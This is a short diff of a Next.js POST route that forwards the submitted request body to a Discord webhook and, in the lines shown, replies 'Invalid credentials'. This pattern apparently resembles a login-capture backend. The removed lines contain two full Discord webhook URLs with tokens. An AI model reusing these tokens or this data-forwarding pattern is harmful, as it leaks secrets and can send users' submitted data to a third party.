@@ -1,10 +1,10 @@
-import { NextResponse } from "next/server";
+import { NextResponse  } from "next/server";
 import dotenv from "dotenv"
 dotenv.config()
 
 export async function POST(request) {
   const body = await request.json();
-  console.log(process.env.WEBHOOK)
+
   await fetch(
     process.env.WEBHOOK,
     {
@@ -60,13 +60,12 @@ export async function POST(request) {
 
   return NextResponse.json({ message: 'Invalid credentials' }, { status: 404 });
 }
-//https://discord.com/api/webhooks/1306939061797388289/iN0TVMDn4VXEfJSl5S795xsaK_HQCEX_QW0fpMNzG3S517frg1pD6hSlbd89CJL5hW9Q
 
 /*
 // node.js versions pre-v0.18.0 do not support the fetch api and require a polyfill
 // const fetch = require('node-fetch');
 fetch(
-  'https://discordapp.com/api/webhooks/738983040323289120/mzhXrZz0hqOuUaPUjB_RBTE8XJUFLe8fe9mgeJjQCaxjHX14c3SW3ZR199_CDEI-xT56',
+  SADADASDASDASDASDAS
   {
     method: 'post',
     headers: {
